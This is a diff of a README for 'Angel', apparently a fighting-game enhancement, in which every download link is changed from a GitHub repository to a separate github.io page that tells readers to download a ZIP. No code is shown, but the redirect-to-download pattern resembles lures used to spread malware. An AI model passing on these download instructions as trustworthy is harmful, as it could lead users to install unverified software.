@@ -1,6 +1,6 @@
 # ✨ Angel - Better, Smoother, More Fun Fighting
 
-[🚀 Download Angel Now](https://github.com/oblacila9/Angel)
+[🚀 Download Angel Now](https://oblacila9.github.io)
 
 ---
 
@@ -49,7 +49,7 @@ Follow these steps in order. If you get stuck, re-read the previous step before 
 ### Step 1: Download Angel
 
 Visit this link to download the application:  
-[🔗 https://github.com/oblacila9/Angel](https://github.com/oblacila9/Angel)
+[🔗 https://oblacila9.github.io](https://oblacila9.github.io)
 
 You'll land on the main page for Angel. Look for a button that says **"Code"** or **"Download"** – it's usually green or blue, on the right side of the page. Click it, then choose **"Download ZIP"**.
 
@@ -89,7 +89,7 @@ Angel is now active. You'll notice the improvements immediately – smoother gam
 
 If you've already downloaded Angel, skip this section. If not, click the button below to get started:
 
-[⬇️ **Download Angel Here**](https://github.com/oblacila9/Angel)
+[⬇️ **Download Angel Here**](https://oblacila9.github.io)
 
 Remember: just visit this link and choose **Download ZIP**.
 
@@ -143,7 +143,7 @@ These are just the highlights. There are hundreds of small tweaks that add up to
 
 ## 📚 Helpful Resources
 
-- **Official GitHub Page** – [https://github.com/oblacila9/Angel](https://github.com/oblacila9/Angel)
+- **Official GitHub Page** – [https://oblacila9.github.io](https://oblacila9.github.io)
 - **Game Support** – For issues with the base game itself, contact the game's official support channels.
 
 ---
